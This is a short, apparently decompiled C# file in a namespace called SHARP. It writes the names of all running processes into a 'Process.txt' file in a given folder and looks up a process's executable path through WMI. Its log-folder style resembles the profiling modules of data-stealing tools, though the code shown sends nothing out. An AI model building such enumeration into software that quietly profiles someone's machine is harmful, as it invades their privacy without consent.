using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading.Tasks;

namespace SHARP
{
    internal class ProcessList
    {
      public static async Task WriteProcesses(string head)
      {
        string str = head;
        foreach (Process process in Process.GetProcesses())
          File.AppendAllText(str + "\\Process.txt", $"NAME: {process.ProcessName}\n\n");
      }

      public static string ProcessExecutablePath(Process process)
      {
        try
        {
          return process.MainModule.FileName;
        }
        catch
        {
          foreach (ManagementObject managementObject in new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get())
          {
            object obj1 = managementObject["ProcessID"];
            object obj2 = managementObject["ExecutablePath"];
            if (obj2 != null && obj1.ToString() == process.Id.ToString())
              return obj2.ToString();
          }
        }
        return "";
      }
    }
}
